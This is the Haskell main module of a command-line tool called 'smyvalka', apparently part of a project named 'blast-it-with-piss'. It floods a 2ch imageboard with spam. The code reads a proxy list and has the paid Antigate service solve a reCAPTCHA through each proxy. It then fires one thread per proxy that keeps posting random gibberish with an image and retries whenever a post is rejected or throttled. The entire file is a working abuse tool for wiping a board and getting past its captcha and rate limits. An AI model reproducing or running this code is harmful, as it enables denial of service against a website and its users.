module Main where
import Import hiding (loop, fail, all)
import BlastItWithPiss.Post
import BlastItWithPiss.Image
import BlastItWithPiss.Parsing
import BlastItWithPiss.Blast
import BlastItWithPiss.Board
import BlastItWithPiss.MonadChoice
import Text.Recognition.Antigate
import System.Console.CmdArgs.Implicit hiding (def)
import Data.Version
import Control.Concurrent
import System.Environment
import Network.Socket
import System.IO.UTF8 (readFile)
import Paths_blast_it_with_piss
import Control.Monad.Trans.Reader
import Control.Monad.Trans.Resource
import System.Random.Shuffle

-- FIXME Shouldn't be here
{-# INLINE generateRandomString #-}
generateRandomString :: MonadChoice m => (Int, Int) -> (Char, Char) -> m String
generateRandomString lengthBounds charBounds = do
    len <- getRandomR lengthBounds
    take len <$> getRandomRs charBounds

generateSymbolString :: MonadChoice m => Int -> m String
generateSymbolString maxlength = do
    let plength = maxlength `div` 6
    num <- generateRandomString (0, plength) ('0', '9')
    beng <- generateRandomString (0, plength) ('A', 'Z')
    seng <- generateRandomString (0, plength) ('a', 'z')
    brus <- generateRandomString (0, plength) ('А', 'Я')
    srus <- generateRandomString (0, plength) ('а', 'я')
    spc <- generateRandomString (0, plength) (' ', ' ')
    shuffleM (num++beng++seng++brus++srus++spc)
-- /FIXME Shouldn't be here

data Config = Config
    {socks :: Bool
    ,strBoard :: String
    ,proxyFile :: String
    ,_antigateKey :: String
    ,_retryCaptcha :: Bool
    }
    deriving (Show, Data, Typeable)

data State = State
    {
     manager :: Manager
    ,board :: Board
    ,antigateKey :: String
    ,proxies :: [BlastProxy]
    ,retryCaptcha :: Bool
    }

type M = ReaderT State IO

impureAnnotatedCmdargsConfig :: Config
impureAnnotatedCmdargsConfig =
    Config
        {socks = False &= help "Файл с проксями содержит Socks5 прокси, а не HTTP?"
        ,strBoard = [] &= argPos 1 &= typ "/Доска/"
        ,proxyFile = [] &= argPos 2 &= typ "Файл_с_проксями"
        ,_antigateKey = [] &= argPos 0 &= typ "Ключ_антигейта"
        ,_retryCaptcha = False &= explicit &= name "r" &= name "retrycaptcha" &= help "Пробовать решить капчу снова при фейле?"
        }
        &= program "smyvalka"
        &= helpArg [explicit, name "h", name "?", name "help", help "Показать вот эту хуйню"]
        &= versionArg [explicit, name "V", name "version", summary (showVersion version)]
        &= summary "Смывалка доски"
        &= help "Формат файла прокси - по прокси на строку, обязательно указывать порт."

displayCaptchaCounters :: IORef Int -> IORef Int -> IO ()
displayCaptchaCounters ready all = go 0 0
  where
    go r a = do
        rd <- readIORef ready
        al <- readIORef all
        when (rd /= r || a /= al) $ do
            putStrLn $ "Готово капчи: " ++ show rd ++ "/" ++ show al
        threadDelay 100000
        go rd al

antigate :: String -> BlastProxy -> Blast (String, String, Image, BrowserState, IO ())
antigate key p = httpWithProxy NoProxy $ do
    m <- getManager
    chKey <- getChallengeKey ssachRecaptchaKey
    captchaBytes <- getCaptchaImage chKey
    (cid, str) <-
        solveCaptcha (3*1000000) (3*1000000)
                     key recaptchaCaptchaConf
                     "recaptcha.jpg" captchaBytes m
    st <- getBrowserState
    return
        (chKey
        ,str
        ,Image "shinku.jpg" "image/jpeg" captchaBytes
        ,st
        ,do runResourceT $ reportBad key cid m
            putStrLn $ "Reported bad captcha for proxy {" ++ show p ++ "}")
  where
    -- assuming recaptcha
    recaptchaCaptchaConf =
        def {phrase = True
            ,regsense = False
            ,numeric = Nothing
            ,calc = False
            ,min_len = 0
            ,max_len = 0
            ,is_russian = False
            ,max_bid = Nothing
            }

antigateThread :: (IO (), IO ()) -> Board -> String -> BlastProxy -> Manager -> MVar (Maybe (String, String, Image, BrowserState, IO ())) -> IO ()
antigateThread (success, fail) board antigateKey p manager mvar = do
    x <- try $ runBlastNew manager $ do
            void $ httpWithProxy p $ httpGetLbs $ ssachBoard board -- try to make a request to filter out dead.
            antigate antigateKey p
    case x of
      Right a -> do
        putMVar mvar $ Just a
        success
      Left (e::SomeException) -> do
        putMVar mvar $ Nothing
        putStrLn $ "{" ++ show p ++"} Failed to get captcha, exception was: " ++ show e
        fail

collectCaptcha :: M [(BlastProxy, MVar (Maybe (String, String, Image, BrowserState, IO ())))]
collectCaptcha = do
    State{..} <- ask
    liftIO $ do
        readycount <- newIORef 0
        proxycount <- newIORef (length proxies)
        let success = atomicModifyIORef readycount $ \a -> (a+1, ())
            fail = atomicModifyIORef proxycount $ \a -> (a-1, ())
        res <- forM proxies $ \p -> do
            mvar <- newEmptyMVar
            _ <- forkIO $ antigateThread (success, fail) board antigateKey p manager mvar
            return (p, mvar)
        putStrLn "Нажмите Enter чтобы запустить пушки когда достаточно капчи будет готово. Пушки сами себя не запустят."
        _ <- forkIO $ displayCaptchaCounters readycount proxycount
        _ <- getLine
        putStrLn "BLAST IT WITH PISS"
        return res

createThread :: Bool -> String -> Manager -> Board -> BlastProxy -> MVar (Maybe (String, String, Image, BrowserState, IO ())) -> IO (MVar ())
createThread retrycaptcha key manager board proxy mvar = do
    putStrLn $ "Creating thread {" ++ show proxy ++ "}"
    m <- newEmptyMVar
    void $ forkIO $ do
        _x <- takeMVar mvar
        case _x of
            Nothing -> do
                putMVar m ()
            Just _x -> go m _x
    return m
  where
    go m (chKey, answer, image, st, badCaptcha) = do
        handle (\(e::SomeException) -> liftIO $ print e) $ do
            putStrLn $ "{" ++ show proxy ++ "} Started."
            txt <- generateSymbolString 300
            let (wakabapl, otherfields) = ssachLastRecordedWakabaplAndFields board
            req <- prepare board Nothing (PostData "" txt (Just image) False False False False)
                    chKey answer wakabapl otherfields ssachLengthLimit
            fix $ \goto -> do
                outcome <- fmap fst $ runBlast manager st $ do
                    httpSetProxy proxy
                    post req
                putStrLn $ "Finished {" ++ show proxy ++ "}, outcome: " ++ show outcome
                case outcome of
                    PostRejected -> goto
                    Five'o'ThreeError -> goto
                    o | o==NeedCaptcha || o==WrongCaptcha -> do
                        badCaptcha
                        when retrycaptcha $ do
                            putStrLn $ "Retrying captcha for {" ++ show proxy ++ "}"
                            r <- runBlast manager st $ antigate key proxy
                            go m r
                    _ -> return ()
        putMVar m ()

mainloop :: M ()
mainloop = do
    State{..} <- ask
    assoc <- collectCaptcha
    waitmvars <- liftIO $ forM assoc $
        \(p, m) -> createThread retryCaptcha antigateKey manager board p m
    loop waitmvars (length waitmvars)
  where
    loop [] _ = liftIO $ putStrLn "Ну вот и всё, ребята."
    loop ws fsl = do
        liftIO $ threadDelay 100000
        nws <- liftIO $ filterM isEmptyMVar ws
        let nwl = length nws
        when (nwl /= length ws) $ do
            liftIO $ putStrLn $ "Завершено " ++ show (fsl-nwl) ++ " из " ++ show fsl
        loop nws fsl

main :: IO ()
main = withSocketsDo $ do
    let md = cmdArgsMode impureAnnotatedCmdargsConfig
    ifM (null <$> getArgs)
        (print md) $ do
        Config{..} <- cmdArgsRun md
        let board = fromMaybe (error $ "Не смог прочитать \"" ++ strBoard ++ "\" как борду, возможно вы имели ввиду \"/" ++ strBoard ++ "/\"?") $
                        readBoard $ strBoard
        rawIps <- nub . filter (not . null) . lines <$> readFile proxyFile
        let (errors, proxies) =
                partitionEithers $
                    map (\x -> maybe (Left x) Right $ readBlastProxy socks x)
                        rawIps
        forM_ errors $ hPutStrLn stderr . ("Couldn't read \"" ++) . (++ "\" as a proxy")
        bracket (newManager def{managerConnCount=1000000}) closeManager $
            \m -> runReaderT mainloop (State m board _antigateKey proxies _retryCaptcha)
